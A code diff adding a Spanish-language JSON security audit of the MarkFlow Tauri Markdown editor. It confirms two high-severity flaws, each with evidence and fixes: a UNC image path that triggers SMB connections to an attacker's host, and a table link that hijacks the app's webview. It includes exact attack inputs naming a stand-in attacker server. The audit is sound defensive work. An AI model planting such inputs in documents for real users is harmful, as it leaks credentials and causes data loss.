@@ -1,0 +1,136 @@
+{
+  "validador": "adversarial-unc-y-navegacion",
+  "metodo": "Sólo lectura de código y de documentación. No se compiló, no se ejecutó, no se instaló nada, no se abrió el programa y no se hizo ninguna petición a ningún servidor de prueba. Fuentes de plataforma leídas EN DISCO, fijadas por los lockfiles del propio proyecto: node_modules/@lezer/markdown 1.7.x, node_modules/@codemirror/view, node_modules/@tauri-apps/api 2.11.1, y en el registro de cargo tauri-2.11.5, wry-0.55.1, tauri-plugin-opener-2.5.5, tauri-plugin-dialog-2.7.3. Documentación oficial consultada por web: Microsoft Learn (bloqueo de NTLM en SMB) y fuente de Chromium/Blink (anchor_element.cc, editing_utilities.cc).",
+  "candidatos": [
+    {
+      "id": "A-unc",
+      "veredicto": "confirmado",
+      "intentos_de_refutacion": [
+        {
+          "via": "El parser: ¿lezer-markdown reconoce `\\\\servidor\\pub\\x.png` como destino, o las barras invertidas se comen como escapes?",
+          "que_comprobe": "parseURL lleva una bandera `escaped`: ante `\\` (92) pone escaped=true y el carácter siguiente se consume sin interpretarse, pero NO se elimina ni se reescribe nada — parseURL devuelve `elt(Type.URL, start+offset, pos+offset)`, o sea un RANGO del texto original, no una cadena desescapada. El recorrido termina en el `)` (41, depth 0) y finishLink exige `cx.char(pos) == 41`, que se cumple, así que emite un nodo Image que abarca `![](\\\\servidor\\pub\\x.png)` entero. Además el bucle de inline salta de `]` directamente a link.to, así que parseEscape nunca llega a tocar el interior de los paréntesis.",
+          "resultado": "no refuta",
+          "evidencia": "node_modules/@lezer/markdown/dist/index.js:1558-1590 (parseURL) y :1519-1553 (finishLink)"
+        },
+        {
+          "via": "Aunque el parser lo reconozca: ¿MarkFlow usa el destino que el parser desescapó, o el texto crudo?",
+          "que_comprobe": "Usa el TEXTO CRUDO. construir() hace `doc.sliceString(nodo.from, nodo.to)` sobre el nodo Image y le aplica su propia regex `^!\\[([^\\]]*)\\]\\(([^)\\s]+)(?:\\s+\"[^\"]*\")?\\)$`. m[2] sale con las DOS barras invertidas intactas. El punto de refutación más probable que me señalaron muere aquí: no hay ninguna etapa que desescape.",
+          "resultado": "no refuta",
+          "evidencia": "src/livepreview.ts:199-209"
+        },
+        {
+          "via": "rutaAbsoluta: ¿qué hace exactamente con esa cadena?",
+          "que_comprobe": "Línea 178, `/^(https?|data|blob):/i` — no casa. Línea 179, `/^([a-z]:[\\\\/]|\\\\\\\\)/i` — en el literal del regex `\\\\\\\\` son DOS barras invertidas reales, y la cadena empieza con exactamente dos: casa, y hace `return fuente` VERBATIM. Se devuelve antes del decodeURI de la :182 (así que tampoco hay riesgo de URIError) y antes de consultar carpetaActual(): da igual si hay archivo abierto o no.",
+          "resultado": "no refuta",
+          "evidencia": "src/widgets.ts:177-183"
+        },
+        {
+          "via": "¿Se detiene algo entre el widget y el núcleo? ¿La puerta de imágenes remotas la ve?",
+          "que_comprobe": "esRemota es `/^https?:/i`: una UNC no casa, así que el `if` de la :209 ni se evalúa por dentro — no hay tarjeta, no hay botón, no se pide permiso. toDOM cae directo a cargarImagen (:244 -> :186) y a `invoke('leer_imagen', { ruta })` (:190).",
+          "resultado": "no refuta",
+          "evidencia": "src/widgets.ts:167, 209, 244, 186, 190"
+        },
+        {
+          "via": "El ACL de Tauri: ¿puede la página llamar a `leer_imagen` sin declararlo en capabilities/default.json?",
+          "que_comprobe": "Sí. El control sólo se aplica si `plugin_command.is_some() || has_app_acl_manifest || !is_local`. `leer_imagen` no lleva prefijo `plugin:`, el origen es local, y no existe `src-tauri/permissions/` (comprobado: el directorio no está), así que no hay manifiesto ACL de aplicación. Los cinco comandos propios quedan fuera del control desde la página local.",
+          "resultado": "no refuta",
+          "evidencia": "tauri-2.11.5/src/webview/mod.rs:1817-1851; src-tauri/capabilities/default.json; ausencia de src-tauri/permissions/"
+        },
+        {
+          "via": "El núcleo: ¿el filtro de extensión o el tope de tamaño frenan la llamada antes de tocar la red?",
+          "que_comprobe": "No. El orden en leer_imagen es: fs::metadata PRIMERO (:145), luego el tope de 25 MB (:148), luego tipo_por_extension (:157) y por último fs::read (:160). La llamada al sistema de archivos con la ruta del tercero es lo primero que ocurre; ni siquiera hace falta que la extensión sea de imagen para que la conexión saliente ya haya pasado.",
+          "resultado": "no refuta",
+          "evidencia": "src-tauri/src/lib.rs:139-161"
+        },
+        {
+          "via": "¿Cambia algo que el permiso de imágenes remotas esté apagado de fábrica?",
+          "que_comprobe": "No cambia nada, y de hecho agrava. `imagenesRemotas` sólo se lee DENTRO del `if (esRemota(...) && ...)` de la :209, al que una UNC nunca entra. Y el propio comentario de la preferencia promete por escrito «Las imagenes del disco no tienen este problema» — es exactamente la promesa que la ruta UNC rompe. Lo mismo `modo: 'ambos'` de fábrica: el panel de presentación está dibujado desde el arranque, así que el widget se construye con sólo abrir el archivo.",
+          "resultado": "no refuta",
+          "evidencia": "src/preferencias.ts:37-47, 68, 72; src/widgets.ts:209"
+        },
+        {
+          "via": "¿Se dibuja el widget realmente al abrir, o hace falta que el usuario haga algo?",
+          "que_comprobe": "Se dibuja solo, con dos condiciones que el atacante controla: (a) la imagen no puede estar en el renglón del cursor — el cursor nace en 0, o sea en la línea 1, y `tocado()` deja ese renglón en markdown crudo; (b) tiene que caer en el viewport inicial de CodeMirror, porque toDOM sólo se llama para lo visible. Poner la imagen en la línea 3 satisface las dos. Acota el ataque, no lo impide.",
+          "resultado": "no refuta",
+          "evidencia": "src/livepreview.ts:114-120, 199-209; src/main.ts:735-742 (arranque) y :340-376 (abrirRuta)"
+        },
+        {
+          "via": "El hecho de sistema operativo: ¿fs::metadata sobre una UNC en Windows autentica de verdad, o sólo resuelve el nombre?",
+          "que_comprobe": "En Windows std::fs::metadata abre el objeto con CreateFileW (acceso 0 + FILE_FLAG_BACKUP_SEMANTICS) y, si falla, cae a FindFirstFileExW; cualquiera de las dos sobre `\\\\host\\recurso\\...` entra al MUP y al redirector SMB, que monta la sesión. Microsoft lo dice de frente al documentar el bloqueo de NTLM en el cliente SMB: bloquearlo «prevents bad actors from tricking clients into sending NTLM requests to malicious servers». Es decir: la conexión y el intento de autenticación son el comportamiento normal del cliente SMB, no una peculiaridad de este programa.",
+          "resultado": "no refuta",
+          "evidencia": "https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking"
+        }
+      ],
+      "cadena_de_evidencia": "1) ENTRADA — .md de tercero abierto por doble clic (asociación de .md declarada en src-tauri/tauri.conf.json:48-61) o por arrastre (src/main.ts:714-724). 2) src/livepreview.ts:199-209 — el nodo Image existe (node_modules/@lezer/markdown/dist/index.js:1558-1590) y su TEXTO CRUDO se pasa por la regex de la :201: m[2] = '\\\\servidor-del-atacante\\pub\\x.png', con las dos barras invertidas. 3) src/widgets.ts:209 — esRemota (:167) es /^https?:/i y no casa: la puerta no se activa, no hay tarjeta ni botón. 4) src/widgets.ts:244 -> :186 -> :179 — la regex de ruta local casa con las dos barras y hace `return fuente` verbatim, sin decodeURI y sin normalizar. 5) src/widgets.ts:190 — invoke('leer_imagen', { ruta }); el ACL no interviene porque es comando propio desde origen local (tauri-2.11.5/src/webview/mod.rs:1817-1851). 6) SUMIDERO — src-tauri/src/lib.rs:145, fs::metadata sobre la ruta UNC, antes de cualquier filtro; y :160 fs::read si el archivo existe. Windows resuelve el nombre y abre sesión SMB contra el anfitrión que nombró el .md.",
+      "entrada_exacta": "# Nota del cliente\n\nRevisa el croquis:\n\n![](\\\\servidor-del-atacante\\pub\\x.png)\n",
+      "hecho_no_resuelto": "Lo que NO se puede establecer leyendo este repositorio es el detalle del material que Windows entrega al anfitrión: que la sesión llegue hasta una respuesta NTLMv2 con nombre de equipo, dominio y usuario depende del entorno (445 abierto hacia fuera, máquina en dominio o no, política «Block NTLM» de Windows 11 24H2+/Server 2025, zona de seguridad del anfitrión), y que las variantes WebDAV `\\\\host@80\\...` y `\\\\host@SSL@443\\...` salgan por 80/443 depende de que arranque el servicio WebClient. Eso se comprueba con una captura en un anfitrión propio de la red del dueño, nunca contra un tercero. Lo que SÍ queda establecido por código es lo decisivo: el salto de la puerta y la llamada al sistema de archivos con una ruta de red elegida por el documento, con sólo abrirlo y sin ningún aviso — es decir, la conexión saliente al anfitrión del atacante y la confirmación de lectura con huella de IP y hora. La gravedad del material de credencial es lo que queda por medir, no la existencia de la conexión.",
+      "severidad_final": "alta",
+      "arreglo_minimo": "En src/widgets.ts, tratar la ruta de red como REMOTA (no como «imagen de disco») y no\nentregar nunca la cadena cruda del tercero a img.src:\n\n    /** Ruta de red — UNC `\\\\host\\...` o relativa a protocolo `//host/...`. Nunca es local. */\n    const esRutaDeRed = (f: string) => /^(\\\\\\\\|\\/\\/)/.test(f)\n\n    // :167 — la puerta deja de clasificar sólo por prefijo http.\n    const esRemota = (fuente: string) => /^https?:/i.test(fuente) || esRutaDeRed(fuente)\n\n    // :177-183\n    function rutaAbsoluta(fuente: string): string | null {\n      if (/^(https?|data|blob):/i.test(fuente) || esRutaDeRed(fuente)) return null\n      if (/^[a-z]:[\\\\/]/i.test(fuente)) return fuente          // absoluta local\n      const base = carpetaActual()\n      if (!base) return null\n      return base + '\\\\' + decodeURI(fuente).replace(/\\//g, '\\\\')\n    }\n\n    // :185-194 — sin ruta local resoluble, sólo pasa lo que el webview puede pintar\n    // sin salir a la red por su cuenta. Devolver `fuente` a secas reabre el agujero:\n    // Chromium normaliza `\\\\host\\x.png` a `//host/x.png` y lo pide por HTTP.\n    function cargarImagen(fuente: string): Promise<string> {\n      const abs = rutaAbsoluta(fuente)\n      if (!abs) {\n        return /^(https?|data):/i.test(fuente)\n          ? Promise.resolve(fuente)\n          : Promise.reject(new Error('Destino de imagen no admitido: ' + fuente))\n      }\n      ...\n    }\n\nCon esto la UNC cae en la tarjeta de consentimiento que YA existe (widgets.ts:209-235) en vez\nde irse a leer_imagen. Regresión: un .md con ![](\\\\host\\pub\\x.png) no debe producir NINGUNA\nllamada a leer_imagen, y con «Mostrarla» tampoco debe llegar nada a img.src.\n\nAPARTE, misma raíz y mismo arreglo de fondo (no es este candidato pero se cura igual):\nresolver y normalizar la rama absoluta/relativa y comprobar que el resultado siga colgando\nde carpetaActual(); lo que no cuelgue, a la misma tarjeta, mostrando la ruta resuelta."
+    },
+    {
+      "id": "B-navegacion",
+      "veredicto": "confirmado",
+      "intentos_de_refutacion": [
+        {
+          "via": "¿Hay manejador de navegación en el repositorio, en Rust o en configuración?",
+          "que_comprobe": "El builder encadena sólo .plugin(dialog), .plugin(opener), .invoke_handler(...) y .run(...). No hay on_navigation. Y no puede haberlo por configuración: tauri.conf.json no tiene ninguna clave de control de navegación (sólo csp, assetProtocol y la ventana). Dato de paso que corrige al cazador: `tauri::Builder` NI SIQUIERA TIENE método on_navigation — no aparece en app.rs; existe en WebviewBuilder (webview/mod.rs:528) y en plugin::Builder (plugin.rs:458).",
+          "resultado": "no refuta",
+          "evidencia": "src-tauri/src/lib.rs:197-205; src-tauri/tauri.conf.json:12-35; tauri-2.11.5/src/app.rs (sin on_navigation)"
+        },
+        {
+          "via": "¿Filtra Tauri por su cuenta, aunque la aplicación no ponga manejador?",
+          "que_comprobe": "No. Tauri instala SIEMPRE un envoltorio; con el manejador de la aplicación en None, delega en plugins.on_navigation, que recorre los complementos y devuelve true si ninguno se opone; el valor por omisión del trait Plugin::on_navigation es `true`. Grep de `on_navigation` en las fuentes de tauri-plugin-opener-2.5.5 y tauri-plugin-dialog-2.7.3: CERO resultados. Conclusión: toda navegación se permite.",
+          "resultado": "no refuta",
+          "evidencia": "tauri-2.11.5/src/manager/webview.rs:577-604; tauri-2.11.5/src/plugin.rs:93-97 y :952-961"
+        },
+        {
+          "via": "¿Y wry / WebView2? Quizá cancela por omisión.",
+          "que_comprobe": "Al revés: wry engancha NavigationStarting sólo si hay manejador — y aquí lo hay, el envoltorio de Tauri — y hace `args.SetCancel(!allow)`. Como `allow` siempre sale true, nunca cancela. Un `<a href=\"https://…\">` sin target es una navegación de nivel superior: dispara NavigationStarting, no NewWindowRequested.",
+          "resultado": "no refuta",
+          "evidencia": "wry-0.55.1/src/webview2/mod.rs:673-694"
+        },
+        {
+          "via": "EL MEJOR CANDIDATO A REFUTACIÓN: el <a> está dentro de un widget de CodeMirror, dentro de un contenteditable. En Chromium, un enlace dentro de una zona editable NO se sigue con un clic normal.",
+          "que_comprobe": "Es cierto para un enlace EDITABLE, pero éste no lo es. CodeMirror pone `contentEditable = \"false\"` al DOM del widget (`if (!widget.editable) dom.contentEditable = \"false\"` en WidgetTile.of), y WidgetType.editable vale false por omisión; WidgetTabla no lo redefine. En Blink, `HTMLAnchorElementBase::IsLiveLink()` es `IsLink() && !IsEditable(*this)`, y HasEditableLevel devuelve false en cuanto encuentra un ancestro con user-modify: read-only — que es justo lo que produce contenteditable=false. O sea: el ancla ES un enlace vivo y su acción por omisión navega. Es exactamente el patrón que se recomienda por ahí fuera para hacer enlaces pulsables dentro de un contenteditable.",
+          "resultado": "no refuta",
+          "evidencia": "node_modules/@codemirror/view/dist/index.js:2154-2161 y :177; https://raw.githubusercontent.com/chromium/chromium/main/third_party/blink/renderer/core/html/html_anchor_element.cc; https://raw.githubusercontent.com/chromium/chromium/main/third_party/blink/renderer/core/editing/editing_utilities.cc"
+        },
+        {
+          "via": "Aunque el enlace esté vivo, ¿no cancela CodeMirror el evento por su cuenta, o alPicar?",
+          "que_comprobe": "Ninguno de los dos. eventBelongsToEditor devuelve false si el nodo cuelga de un widget cuyo ignoreEvent() es true, y el valor por omisión de WidgetType.ignoreEvent es true; WidgetTabla no lo redefine, así que CodeMirror ni mira el evento. Y alPicar se retira explícitamente cuando el objetivo está dentro de un `a` (`if ((e.target as HTMLElement).closest('input,a')) return`), de modo que ni siquiera llega a su preventDefault — que además sería inútil: preventDefault sobre mousedown no cancela la activación de un ancla. Nadie llama preventDefault sobre el click.",
+          "resultado": "no refuta",
+          "evidencia": "node_modules/@codemirror/view/dist/index.js:4873-4882 y :161; src/widgets.ts:20-27"
+        },
+        {
+          "via": "Si navega, ¿se dispara onCloseRequested y el usuario alcanza a salvar?",
+          "que_comprobe": "No se dispara. onCloseRequested de @tauri-apps/api escucha TauriEvent.WINDOW_CLOSE_REQUESTED, que es un evento de VENTANA emitido por Tauri; una navegación del webview no lo emite. Tampoco hay beforeunload en ningún sitio: grep de beforeunload sobre src/*.ts e index.html, cero resultados. No se pregunta nada.",
+          "resultado": "no refuta",
+          "evidencia": "src/main.ts:697-712; node_modules/@tauri-apps/api/window.js:1632-1641"
+        },
+        {
+          "via": "¿Hay de verdad pérdida de datos, o el estado sobrevive en alguna parte?",
+          "que_comprobe": "No sobrevive nada de lo no guardado. Las pestañas viven en el arreglo `abiertas` en memoria de JS, cada una con sus dos EditorState (ahí está el texto, la selección y la historia de deshacer). localStorage guarda SÓLO las preferencias; `ultimoArchivo` + `reabrir` (de fábrica false) reabren el archivo DE DISCO, nunca los cambios. No hay autoguardado: se quitó el 2026-09-16 y no queda ningún temporizador en main.ts. Al irse la página, se va el arreglo.",
+          "resultado": "no refuta",
+          "evidencia": "src/main.ts:33-53; src/preferencias.ts:48-50, 69, 101-117; src/editor.ts:197-206"
+        },
+        {
+          "via": "¿Puede el usuario volver? ¿Hay forma de recuperar la aplicación?",
+          "que_comprobe": "Parcialmente, y sin que nada se lo diga. Las teclas aceleradoras del navegador siguen encendidas — wry las deja en el valor por omisión de WebView2 (true) y MarkFlow no las apaga — así que Alt+Izquierda debería retroceder. Pero la ventana va sin decoración y un webview de Tauri no tiene barra de direcciones ni botón de atrás: no hay ninguna señal de que eso ya no es MarkFlow, ni pista del atajo, y la página del atacante puede apilar entradas de historial para estorbar el retroceso.",
+          "resultado": "no refuta",
+          "evidencia": "wry-0.55.1/src/lib.rs:1687 y src/webview2/mod.rs:582-585; src-tauri/tauri.conf.json:22"
+        },
+        {
+          "via": "¿No estará el cazador exagerando el impacto? ¿La página remota hereda la autoridad de la aplicación?",
+          "que_comprobe": "No la hereda, y conviene decirlo: en cuanto el origen deja de ser local, `!is_local` fuerza el control ACL sobre TODOS los comandos, y capabilities/default.json no declara ningún patrón `remote`, así que los cinco comandos propios quedan fuera de alcance. Esto ACOTA el hallazgo a pérdida de trabajo y suplantación, sin lectura ni escritura de disco. El cazador ya lo decía y es correcto.",
+          "resultado": "no refuta (acota el impacto)",
+          "evidencia": "tauri-2.11.5/src/webview/mod.rs:1787-1851; src-tauri/capabilities/default.json"
+        }
+      ],
+      "cadena_de_evidencia": "1) ENTRADA — .md de tercero con una tabla. src/livepreview.ts:174-184 detecta el nodo Table (GFM viene incluido en markdownLanguage: node_modules/@codemirror/lang-markdown/dist/index.js:63) y pasa el texto crudo a WidgetTabla. 2) src/widgets.ts:96-98 — celda.innerHTML = enriquecer(c). 3) src/widgets.ts:72 — se emite `<a href=\"https://…\" rel=\"noreferrer\">`. 4) node_modules/@codemirror/view/dist/index.js:2154-2161 — el DOM del widget queda con contentEditable=\"false\", así que el ancla es enlace vivo en Blink; y :4873-4882 con :161 — CodeMirror ignora el evento porque WidgetTabla no redefine ignoreEvent. 5) src/widgets.ts:22 — alPicar se retira ante un objetivo dentro de `a`: nadie llama preventDefault. 6) La víctima pica el enlace — picar un enlace de una tabla es exactamente lo que se espera de un lector de Markdown. 7) tauri-2.11.5/src/manager/webview.rs:577-604 + plugin.rs:93-97 y :952-961 — nadie filtra; wry-0.55.1/src/webview2/mod.rs:673-694 hace SetCancel(false). 8) SUMIDERO — el único webview navega a la página del tercero. src/main.ts:697-712 no se entera (onCloseRequested es evento de ventana) y el arreglo `abiertas` (main.ts:33) con los buffers sucios de hasta 30 pestañas desaparece con la página.",
+      "entrada_exacta": "# Referencias\n\n| Fuente | Enlace |\n| --- | --- |\n| Plantilla oficial | [ver el original](https://servidor-del-atacante.example/parecido) |\n",
+      "hecho_no_resuelto": "Si WebView2 mete la página de MarkFlow en el back/forward cache de Chromium. Si lo hiciera, Alt+Izquierda devolvería el estado íntegro y la pérdida se reduciría a «el usuario tiene que saber el atajo». No se puede establecer leyendo el repositorio: Tauri no fija Cache-Control en su protocolo, wry no pasa banderas de BFCache ni argumentos de navegador más allá de --disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection, y Microsoft no documenta el comportamiento para WebView2. NO cambia el veredicto ni la raíz: la navegación ocurre, nadie pregunta, no hay barra de direcciones ni botón de atrás que le diga al usuario dónde está, y el documento del tercero decide a dónde va el único webview de la aplicación. Comprobación segura del dueño, sin tocar internet ni servidores ajenos: una tabla con un enlace a http://localhost:1420 (el propio devUrl) o a una página de la LAN propia, picar, y mirar si la ventana se va y si Alt+Izquierda devuelve las pestañas sucias tal cual estaban.",
+      "severidad_final": "alta",
+      "arreglo_minimo": "Dos piezas, las dos en el repositorio.\n\n(1) src-tauri/src/lib.rs — CORRECCIÓN AL ARREGLO PROPUESTO POR EL CAZADOR: `tauri::Builder`\nNO tiene método `on_navigation` (verificado: no aparece en tauri-2.11.5/src/app.rs; sólo\nexiste en WebviewBuilder/WebviewWindowBuilder, webview/mod.rs:528, y en plugin::Builder,\nplugin.rs:458). Encadenar `.on_navigation(...)` en el builder de la aplicación NO compila.\nComo la ventana se declara en tauri.conf.json y no se construye en Rust, la vía mínima que\nsí funciona es un complemento de una sola responsabilidad:\n\n    .plugin(\n      tauri::plugin::Builder::<tauri::Wry>::new(\"navegacion\")\n        .on_navigation(|_webview, url| {\n          // Sólo dentro de la propia aplicación. `localhost` es el devUrl de\n          // tauri.conf.json:8; en Windows la página se sirve en http://tauri.localhost.\n          matches!(url.host_str(), Some(\"tauri.localhost\") | Some(\"localhost\"))\n        })\n        .build(),\n    )\n\n(2) Para que los enlaces sigan sirviendo, mandarlos al navegador del sistema desde el\nfrontend con openUrl() de @tauri-apps/plugin-opener, que YA está concedido\n(capabilities/default.json:10) e inicializado (lib.rs:201) y hoy no lo usa nadie:\n\n    import { openUrl } from '@tauri-apps/plugin-opener'\n    document.addEventListener('click', (e) => {\n      const a = (e.target as HTMLElement).closest?.('a[href]') as HTMLAnchorElement | null\n      if (!a) return\n      e.preventDefault()\n      const href = a.getAttribute('href') ?? ''\n      if (/^(https?|mailto):/i.test(href)) void openUrl(href)\n    })\n\nRegresión: picar un enlace https de una tabla debe abrir el navegador del sistema y dejar la\nventana de MarkFlow exactamente donde estaba, con sus pestañas sucias intactas.\n\nNOTA: el filtro de esquema en enriquecer() (widgets.ts:72) hace falta igual, pero es de OTRO\ncandidato (javascript: en celda de tabla). El manejador de navegación NO lo tapa: un href\njavascript: no dispara NavigationStarting."
+    }
+  ]
+}
